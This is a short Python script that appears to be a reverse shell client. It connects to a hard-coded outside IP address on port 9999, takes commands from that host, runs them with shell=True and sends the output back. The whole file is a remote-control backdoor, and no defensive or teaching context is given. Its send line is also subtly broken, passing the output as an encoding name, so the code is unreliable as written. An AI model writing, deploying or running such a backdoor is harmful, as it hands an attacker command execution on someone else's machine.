import socket
import os
import subprocess

s = socket.socket()
host = "45.154.99.5"
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode() == 'cd':
        os.chdir(data[3:].decode())

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode(),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte)
        currentWD = os.getcwd() + "> "
        s.send("str".encode(output_str + currentWD))

        print(output_str)